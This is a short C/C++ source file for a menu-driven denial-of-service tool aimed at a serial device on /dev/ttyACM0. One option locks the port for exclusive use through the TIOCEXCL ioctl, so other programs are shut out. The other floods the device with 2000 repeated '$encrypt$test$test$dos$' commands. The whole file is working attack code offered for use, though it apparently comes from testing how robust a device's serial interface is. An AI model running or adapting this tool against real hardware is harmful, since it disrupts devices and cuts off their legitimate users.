#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <termios.h>
#include <fcntl.h>
#include <errno.h>
#include <stdio.h>

#include "serialib.h"

#define SERIAL_DEVICE "/dev/ttyACM0"
#define BUFFER_SIZE 256

int count_max = 2000;

int print_menu(){
    int ch;
    printf("DoS Attack Vectors\n");
    printf("[1] TIOCEXCL lock\n");
    printf("[2] Command Flood\n");
    printf(">> ");
    scanf("%i", &ch);
    return ch;
}
int block_device(const char * device){
    int fd = open(device, O_RDWR | O_NOCTTY);
    if(fd== -1){
        return fd;
    }
    // set TIOCEXCL flag
    ioctl(fd, TIOCEXCL);
    return fd;
}

int main(){

    serialib serial;
    int fd = 0;
    int code = 0;
    int ch = 0;
    int count = 0;
    int i = 0;
    int counter = 0;
    char output[BUFFER_SIZE+100];

    code = print_menu();
    switch(code){
        case 1:
        // device lockout
        fd = block_device(SERIAL_DEVICE);
        if(fd!=-1){
        printf("Serial port blocked!\n");
        printf("Press enter to unblock.");
        scanf("%c%c", &ch, &ch);
        close(fd);
        }
        else{
            printf("Failed to set TIOCEXCL");
        }
        break;

        case 2:
        // flood device with requests
        code = serial.openDevice(SERIAL_DEVICE, 115200);
        if(code !=1){
            printf("Failure.");
            exit(0);
        }
        printf("Flooding...\n");
        while(count < count_max){
        serial.flushReceiver();
        sprintf(output,"$encrypt$test$test$dos$");
        serial.writeString(output);
        count +=1;
        usleep(10000);
        }
        printf("Flood complete\n");
        serial.closeDevice();
        break;
    }

}